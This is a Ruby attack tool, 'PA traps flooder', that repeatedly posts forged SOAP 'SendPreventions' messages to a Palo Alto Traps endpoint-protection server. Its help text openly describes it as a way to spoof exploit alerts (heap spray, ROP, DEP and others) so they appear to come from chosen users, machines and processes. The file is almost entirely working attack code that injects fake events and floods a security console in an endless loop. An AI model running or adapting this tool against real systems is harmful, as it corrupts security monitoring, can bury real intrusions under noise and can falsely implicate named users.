#!/usr/bin/ruby
# PA traps flooder :)
# Michael Hendrickx - @ndrix

require 'net/http'
require 'securerandom'
require 'getoptlong'

users = ""
machines = ""
traps = {}
my = {}
cyvera_codes = %w{ D01 D02 T01 T02 B01 DllProt R01 R02 S01 K01 G01 H01 H02 FontProt WildFire };
processes = %w{ iexplore outlook winword excel virus password_cracker sniff vpn_client keygen crack pwgen ntpass portscan}

# we start with the credits :)
puts "Palo Alto Traps Generator v1"
puts "------------------< ndrix >-"
puts " "

def usage
	puts "pa_traps.rb -s trapsserver:2125 -u <users> -m <machines> [options]"
	puts "where options are:"
  puts "  --server    | -s <target:port>: traps server and port (usually 2125)"
  puts "  --users     | -u <users>: space delimited user list"
  puts "  --machines  | -m <machines>: space delimited machines list"
  puts "  --types     | -t <cyvera types>: Error codes (see --help)"
  puts "  --process   | -p <process name>: process names to report"
  puts "  --notify    | -N: send (less severe) notify events"
  puts "  --terminate | -T: send (severe) termination events (default)"
  puts "  --delay     | -d <sec>: number of seconds between requests (default 1)"
  puts "  --help      | -h : more info"
  puts "\n   -s, -u and -m are mandatory"
  puts "\n Examples:"
  puts "  pa_traps.rb -s target:2125 -u \"admin bob alice\" -m \"laptop1 laptop2\""
  puts "  -> to spoof all types from users admin, bob and alive, originating from "
  puts "     machines laptop1 and laptop2"
  puts "\n  pa_traps.rb -s target:2125 -u mike -m \"DOMAIN\\mikepc\" -t H01 -p iexplore"
  puts "  -> to spoof heap corruptions from user \"DOMAIN\\mike\" on \"mikepc\", "
  puts "     making it appear from IE"
	exit
end

def display_help
  puts "\n --server | -s <host:port>"
  puts "   where <host> is the hostname/ip of the server, and <port> is the port "
  puts "   where traps is running on (defualt 2125)"
  puts "\n --users | -u <users>"
  puts "   where <users> could be a single value, or a space delimited list"
  puts "   ex: \"admin DOMAIN\\bob DOMAIN\\alice AUTHORITY\\SYSTEM\"\n"
  puts "\n --machines | -m <machines>"
  puts "   where <machines> could be a single value, or a space delimited list"
  puts "   ex: \"laptop1 laptop2 server1 dbserver01\"\n"
	puts "\n --types | -t <type>"
	puts "   where <type> is an internal cyvera \"error\" code: "
	puts "    - D01			Periodic heap spraying"
	puts "    - D02			Logic Bug D02"
	puts "    - T01			Logic Bug T01"
	puts "    - T02			Memory Limit Heap Spray Check"
	puts "    - B01			Hot Patch Protection"
	puts "    - DllProt	DLL Protection"
	puts "    - R01			ROP Mitigation"
	puts "    - R02			Random Pre-alloc"
	puts "    - S01			SEH Protection"
	puts "    - K01			Null Dereference Protection"
	puts "    - G01			Data Execution Prevention"
	puts "    - H01			Heap Corruption"
	puts "    - H02			Exception Heap Spray Check"
	puts "    - FontProt Font Protection"
	puts "    - WildFire WilidFire detection"
end

def send_msg
	http_headers = {
		"Content-Type" => "application/soap+xml; charset=utf-8", 
		"Expect" => "100-continue",
		"Connection" => "Keep-Alive"
	}

	machine = machines.sample
	user = users.sample
	process = processes.sample
	code = cyvera_codes.sample

	soap_envelope = <<-SOAP
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
	<s:Header>
		<a:Action s:mustUnderstand="1">http://tempuri.org/IClientServices/SendPreventions</a:Action>
		<a:MessageID>urn:uuid:#{SecureRandom.uuid}</a:MessageID>
		<a:ReplyTo>
			<a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		</a:ReplyTo>
		<a:To s:mustUnderstand="1">http://#{traps[:server]}:#{traps[:port]}/CyveraServer/</a:To>
	</s:Header>
	<s:Body>
		<SendPreventions xmlns="http://tempuri.org/">
			<machine>#{machine}</machine>
			<preventions xmlns:b="http://schemas.datacontract.org/2004/07/Cyvera.Common.Interfaces" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
				<b:PreventionDetails>
					<b:Id>0</b:Id>
					<b:MachineName>#{machine}</b:MachineName>
					<b:Message>Exploit attempt was prevented by Traps</b:Message>
					<b:PreventionKey>eec0b051-d6fc-48f3-a9fa-3c44f90882ac</b:PreventionKey>
					<b:ProcessName>#{process}</b:ProcessName>
					<b:Time>2014-10-15T18:59:40</b:Time>
					<b:UserName>#{user}</b:UserName>
					<b:Arguments>#{process}.exe</b:Arguments>
					<b:CyveraCode>#{code}</b:CyveraCode>
					<b:CyveraInternalCode i:nil="true"/>
					<b:CyveraVersion>3.1.2.1546</b:CyveraVersion>
					<b:FileName>
						C:\\Windows\\#{process}.exe&#xD;
					</b:FileName>
					<b:PreventionMode>Terminate</b:PreventionMode>
					<b:ProcessHash i:nil="true"/>
					<b:ProcessVersion/>
					<b:Sent>true</b:Sent>
					<b:SentToServerTime>0001-01-01T00:00:00</b:SentToServerTime>
					<b:Source>Unknown</b:Source>
					<b:Status i:nil="true"/>
					<b:URL />
				</b:PreventionDetails>
			</preventions>
		</SendPreventions>
	</s:Body>
</s:Envelope>
SOAP

	# summary
	Net::HTTP.start(traps[:server], traps[:port]) do |http|
		r1 = http.request_post('/CyveraServer/', soap_envelope, http_headers);
		puts r1
		puts r1.inspect
	end
end

usage if ARGV.empty?

opts = GetoptLong.new(
	[ "--users", "-u", 		GetoptLong::REQUIRED_ARGUMENT ],
	[ "--machines", "-m", GetoptLong::REQUIRED_ARGUMENT ],
	[ "--types", "-t",		GetoptLong::REQUIRED_ARGUMENT ],
	[ "--server", "-s",		GetoptLong::REQUIRED_ARGUMENT ],
	[ "--process", "-p",	GetoptLong::REQUIRED_ARGUMENT ],
	[ "--notify", "-N",		GetoptLong::NO_ARGUMENT ],
	[ "--terminate","-T", GetoptLong::NO_ARGUMENT ],
	[ "--help","-h", 			GetoptLong::NO_ARGUMENT ],
	[ "--delay", "-d",		GetoptLong::REQUIRED_ARGUMENT ]
)


opts.each do |opt, arg|
	case opt
		when '--help'
			display_help
			exit
		when '--users'
			users = arg.split
		when '--machines'
			machines = arg.split
		when '--process'
			processes = arg.split
		when '--server'		
			traps[:server] 	= arg.split(":")[0]
			traps[:port] 		= arg.split(":")[1] || 2125
		when '--types'
			cyvera_codes = cyvera_codes & arg.split	
	end
end

# get the arguments
my[:machine] 		= ARGV[1]
my[:username] 	= ARGV[2]
my[:process] 		= ARGV[3]
my[:error_code] = ARGV[4]

while 1
	send_msg
  sleep 1
end
